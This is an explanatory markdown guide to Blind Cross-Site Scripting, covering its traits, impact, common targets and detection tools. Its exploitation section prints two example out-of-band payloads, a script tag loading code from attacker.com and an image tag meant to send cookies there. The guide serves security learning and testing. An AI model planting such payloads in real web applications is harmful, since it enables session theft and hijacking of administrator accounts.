 
# Blind Cross-Site Scripting (Blind XSS)

## What is Blind XSS?

Blind XSS is a type of XSS attack where the injected payload does **not execute immediately** in the attacker’s browser but instead executes **later** when another user (often an admin) views the stored data in their browser.

* In short: It’s a hidden form of Stored XSS.

---

## Key Characteristics

* Payload is **saved** and **executed later**.
* Often triggered in **restricted/internal applications** such as:

  * Admin dashboards
  * Support tools
  * Error log viewers
  * Customer ticket systems
  * Moderation or reporting panels
* Execution may be **delayed (hours, days, weeks)**.
* Attackers **cannot directly see results** without an external callback mechanism.

---

## Impact of Blind XSS

* **Stealing sensitive data** (admin credentials, session tokens).
* **Privilege escalation** by hijacking privileged user accounts.
* **Redirecting admins** to malicious sites.
* **Installing malware** or persistent backdoors via admin interaction.
* **Lateral movement** inside corporate/internal systems.

---

## Common Targets

* Feedback/contact forms
* Chat applications
* Analytics parameters (UTM, referrer, tracking IDs)
* Logs and error handlers
* Customer support/ticket systems
* Moderation/reporting tools

---

## Detection & Exploitation

* Simple `alert(1)` payloads don’t work (no attacker feedback).
* Instead, attackers use **out-of-band (OOB) payloads** that call back to their server.
* Examples:

  ```html
  <script src="https://attacker.com/x.js"></script>
  <img src="https://attacker.com/ping?cookie=document.cookie">
  ```
* Tools for detection:

  * **Burp Suite Collaborator**
  * **Blind XSS monitoring services** (e.g., xsshunter)
  * Custom **C2 callback servers**

---

## Summary

* **Blind XSS = Stored XSS with delayed & hidden execution.**
* Targets **internal/admin components** not visible to attackers.
* Hard to detect, but **highly impactful** when successful.
* Often requires **external callback mechanisms** for confirmation.
